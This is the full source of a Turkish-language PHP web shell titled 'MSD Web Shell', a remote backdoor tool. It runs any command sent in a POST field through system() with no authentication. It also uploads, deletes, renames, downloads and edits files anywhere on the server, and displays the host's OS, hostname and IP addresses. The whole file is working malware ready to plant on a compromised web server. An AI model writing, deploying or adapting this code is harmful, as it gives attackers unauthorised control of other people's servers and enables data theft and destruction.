<?php
$yol = isset($_GET['dizin']) ? $_GET['dizin'] : './';
$gercekYol = realpath($yol);
if (!$gercekYol || !is_dir($gercekYol)) {
    $gercekYol = './';
}

if (isset($_POST['komut'])) {
    echo "<pre>";
    system($_POST['komut']);
    echo "</pre>";
}

if (isset($_FILES['dosya'])) {
    $hedef_dosya = $gercekYol . "/" . basename($_FILES["dosya"]["name"]);
    if (move_uploaded_file($_FILES["dosya"]["tmp_name"], $hedef_dosya)) {
        echo "Dosya yüklendi: " . htmlspecialchars(basename($_FILES["dosya"]["name"]));
    } else {
        echo "Dosya yükleme hatası.";
    }
}

if (isset($_POST['klasoradi']) && !empty($_POST['klasoradi'])) {
    $yeniKlasor = $gercekYol . '/' . $_POST['klasoradi'];
    if (mkdir($yeniKlasor)) {
        echo "Klasör oluşturuldu: " . htmlspecialchars($_POST['klasoradi']);
    } else {
        echo "Klasör oluşturulurken hata oluştu: " . htmlspecialchars($_POST['klasoradi']);
    }
}

if (isset($_GET['sil'])) {
    $silinecekDosya = $gercekYol . '/' . $_GET['sil'];
    if (unlink($silinecekDosya)) {
        echo "Dosya silindi: " . htmlspecialchars($_GET['sil']);
    } else {
        echo "Dosya silme hatası.";
    }
}

if (isset($_POST['yenidenadlandir'])) {
    $eskiAd = $gercekYol . '/' . $_POST['eskiad'];
    $yeniAd = $gercekYol . '/' . $_POST['yeniad'];
    if (rename($eskiAd, $yeniAd)) {
        echo "Dosya yeniden adlandırıldı: " . htmlspecialchars($_POST['yeniad']);
    } else {
        echo "Dosya yeniden adlandırma hatası.";
    }
}

if (isset($_GET['indir'])) {
    $indirilecekDosya = $gercekYol . '/' . $_GET['indir'];
    if (file_exists($indirilecekDosya)) {
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="'.basename($indirilecekDosya).'"');
        header('Expires: 0');
        header('Cache-Control: must-revalidate');
        header('Pragma: public');
        header('Content-Length: ' . filesize($indirilecekDosya));
        readfile($indirilecekDosya);
        exit;
    } else {
        echo "Dosya indirme hatası.";
    }
}

if (isset($_POST['duzenleDosya']) && isset($_POST['icerik'])) {
    $dosyaAdi = $gercekYol . '/' . urldecode($_POST['duzenleDosya']);
    $yeniIcerik = $_POST['icerik'];
    if (file_put_contents($dosyaAdi, $yeniIcerik)) {
        echo "Dosya başarıyla kaydedildi: " . htmlspecialchars($_POST['duzenleDosya']);
    } else {
        echo "Dosya kaydedilirken hata oluştu.";
    }
}

if (isset($_GET['duzenle'])) {
    $duzenleDosya = $gercekYol . '/' . urldecode($_GET['duzenle']);
    $icerik = file_get_contents($duzenleDosya);
    echo "<script>
        document.addEventListener('DOMContentLoaded', function() {
            document.getElementById('duzenlemePopup').style.display = 'block';
            document.getElementById('duzenleDosyaAdi').value = '".htmlspecialchars($_GET['duzenle'])."';
            document.getElementById('icerik').value = `".htmlspecialchars($icerik). "`;
        });
    </script>";
}

function dizinListele($dizin) {
    if (realpath($dizin) != realpath('/')) {
        $ustDizin = dirname($dizin);
        echo "<tr><td><a href='?dizin=" . urlencode($ustDizin) . "'>..</a></td></tr>";
    }

    $dosyalar = scandir($dizin);
    foreach ($dosyalar as $dosya) {
        if ($dosya === '.' || $dosya === '..') continue;
        $dosyaYolu = $dizin . '/' . $dosya;
        $boyut = is_dir($dosyaYolu) ? 'DIZIN' : filesize($dosyaYolu) . ' bayt';
        $izinler = substr(sprintf('%o', fileperms($dosyaYolu)), -4);
        $sahip = fileowner($dosyaYolu);
        $grup = filegroup($dosyaYolu);
        echo "<tr>";
        echo "<td><a href='?dizin=" . urlencode($dosyaYolu) . "'>" . htmlspecialchars($dosya) . "</a></td>";
        echo "<td>$boyut</td>";
        echo "<td>$izinler</td>";
        echo "<td>$sahip:$grup</td>";
        echo "<td><a href='?dizin=" . urlencode($dizin) . "&sil=" . urlencode($dosya) . "' class='btn-sil'>Sil</a></td>";
        echo "<td><a href='?dizin=" . urlencode($dizin) . "&indir=" . urlencode($dosya) . "' class='btn-indir'>İndir</a></td>";
        echo "<td><a href='?duzenle=" . urlencode($dosya) . "' class='btn-duzenle'>Düzenle</a></td>";
        echo "</tr>";
    }
}

$sistemBilgileri = [
    'İşletim Sistemi' => php_uname(),
    'Sunucu Hostname' => gethostname(),
    'Sunucu IP Adresi' => $_SERVER['SERVER_ADDR'],
    'Giren IP Adresi' => $_SERVER['REMOTE_ADDR']
];
?>

<html lang="tr">
<head>
    <title>MSD Web Shell</title>
    <style>
        body {
            background-color: #f4f4f4;
            color: #333;
            font-family: 'Arial', sans-serif;
            margin: 0;
            padding: 0;
        }

        h1, h3 {
            color: #2c3e50;
            text-align: center;
        }

        .container {
            width: 90%;
            margin: 0 auto;
            padding: 20px;
        }

        .bilgiler {
            background-color: #ecf0f1;
            padding: 20px;
            border-radius: 10px;
            margin-bottom: 20px;
        }

        .bilgiler p {
            margin: 0;
            font-size: 16px;
        }

        input, select, textarea {
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            border: 1px solid #ddd;
            border-radius: 5px;
            font-size: 16px;
        }

        .btn {
            background-color: #3498db;
            color: white;
            padding: 10px 15px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            font-size: 16px;
            margin-top: 10px;
        }

        .btn:hover {
            background-color: #2980b9;
        }

        table {
            width: 100%;
            border-collapse: collapse;
            margin-top: 20px;
        }

        th, td {
            padding: 10px;
            border: 1px solid #ddd;
            text-align: left;
        }

        th {
            background-color: #2c3e50;
            color: white;
        }

        .btn-sil {
            background-color: #e74c3c;
            padding: 5px 10px;
            color: white;
            border-radius: 3px;
            text-decoration: none;
        }

        .btn-sil:hover {
            background-color: #c0392b;
        }

        .btn-indir, .btn-duzenle {
            background-color: #3498db;
            padding: 5px 10px;
            color: white;
            border-radius: 3px;
            text-decoration: none;
        }

        .btn-indir:hover, .btn-duzenle:hover {
            background-color: #2980b9;
        }

        .popup {
            display: none;
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background-color: #fff;
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
            z-index: 999;
            width: 50%;
        }

        .popup h2 {
            color: #2c3e50;
        }

        .popup button {
            background-color: #3498db;
            color: white;
            padding: 10px 20px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
        }

        .popup button:hover {
            background-color: #2980b9;
        }

        .yardim_buton {
            position: fixed;
            bottom: 20px;
            right: 20px;
            background-color: #3498db;
            color: white;
            padding: 10px 20px;
            border: none;
            border-radius: 50px;
            cursor: pointer;
        }

        .yardim_buton:hover {
            background-color: #2980b9;
        }
    </style>
</head>
<body>

    <div class="container">
        <h1>MSD Web Shell</h1>

        <div class="bilgiler">
            <h3>Sunucu Bilgileri</h3>
            <?php foreach ($sistemBilgileri as $bilgi => $deger): ?>
                <p><strong><?php echo $bilgi; ?>:</strong> <?php echo $deger; ?></p>
            <?php endforeach; ?>
        </div>

        <button class="yardim_buton" onclick="yardimAc()">Yardım</button>

        <div id="yardimPopup" class="popup">
            <h2>Yardım</h2>
            <p>Bu shell ile şunları yapabilirsiniz:</p>
            <ul>
                <li>Komutlar çalıştırabilirsiniz.</li>
                <li>Dosyalar yükleyebilirsiniz.</li>
                <li>Klasörler oluşturabilirsiniz.</li>
                <li>Dosyaları silebilir, düzenleyebilir ve yeniden adlandırabilirsiniz.</li>
                <li>Üst dizine çıkmak için .. bağlantısına tıklayabilirsiniz.</li>
            </ul>
            <button onclick="yardimKapat()">Kapat</button>
        </div>

        <form method="POST">
            <input type="text" name="komut" placeholder="Komut girin" />
            <input type="submit" class="btn" value="Çalıştır" />
        </form>

        <h3>Şu Anki Konum: <?php echo htmlspecialchars($gercekYol); ?></h3>
        <table>
            <tr>
                <th>Ad</th>
                <th>Boyut</th>
                <th>İzinler</th>
                <th>Sahip:Grup</th>
                <th>Sil</th>
                <th>İndir</th>
                <th>Düzenle</th>
            </tr>
            <?php dizinListele($gercekYol); ?>
        </table>

        <h3>Dosya Yükle</h3>
        <form method="POST" enctype="multipart/form-data">
            <input type="file" name="dosya" />
            <input type="submit" class="btn" value="Yükle" />
        </form>

        <h3>Klasör Oluştur</h3>
        <form method="POST">
            <input type="text" name="klasoradi" placeholder="Klasör adı" />
            <input type="submit" class="btn" value="Oluştur" />
        </form>

        <h3>Dosyayı Yeniden Adlandır</h3>
        <form method="POST">
            <input type="text" name="eskiad" placeholder="Eski dosya adı" />
            <input type="text" name="yeniad" placeholder="Yeni dosya adı" />
            <input type="submit" name="yenidenadlandir" class="btn" value="Yeniden Adlandır" />
        </form>

        <div id="duzenlemePopup" class="popup">
            <h2>Dosya Düzenleme</h2>
            <form method="POST">
                <textarea id="icerik" name="icerik" rows="10" placeholder="Dosya içeriğini buraya girin..."></textarea><br />
                <input type="hidden" id="duzenleDosyaAdi" name="duzenleDosya" value="" />
                <button type="submit">Kaydet</button>
                <button type="button" onclick="duzenlemeKapat()">İptal</button>
            </form>
        </div>
    </div>
</body>
    <script>
        function yardimAc() {
            document.getElementById("yardimPopup").style.display = "block";
        }

        function yardimKapat() {
            document.getElementById("yardimPopup").style.display = "none";
        }

        function duzenlemeKapat() {
            document.getElementById("duzenlemePopup").style.display = "none";
        }
    </script>
</html>
